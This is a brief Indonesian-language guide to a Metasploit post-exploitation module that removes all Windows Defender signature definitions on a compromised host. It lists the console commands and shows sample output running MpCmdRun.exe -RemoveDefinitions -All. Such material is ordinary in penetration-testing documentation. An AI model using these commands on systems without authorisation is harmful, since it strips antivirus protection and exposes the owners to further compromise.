# rollback_defender_signatures

Modul `rollback_defender_signatures` di Metasploit adalah modul `post-exploitation` untuk sistem Windows yang digunakan untuk mengembalikan (rollback) definisi atau signature Windows Defender ke versi sebelumnya.

## Cara Penggunaan di Metasploit

```
use post/windows/manage/rollback_defender_signatures
set SESSION <ID>
set VERBOSE true
rollback
```

Hasil output-nya seperti ini:

```
[*] program_path = C:\Program Files
[*] file_path = C:\Program Files\Windows Defender\MpCmdRun.exe
[*] Removing all definitions for Windows Defender
[*] Running cmd.exe /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
[*] 
Service Version: 6.1.7600.16385
Engine Version: 1.1.6402.0
AntiSpyware Signature Version: 1.95.191.0

Starting engine and signature rollback to none...Done!
[*] Post module execution completed
```
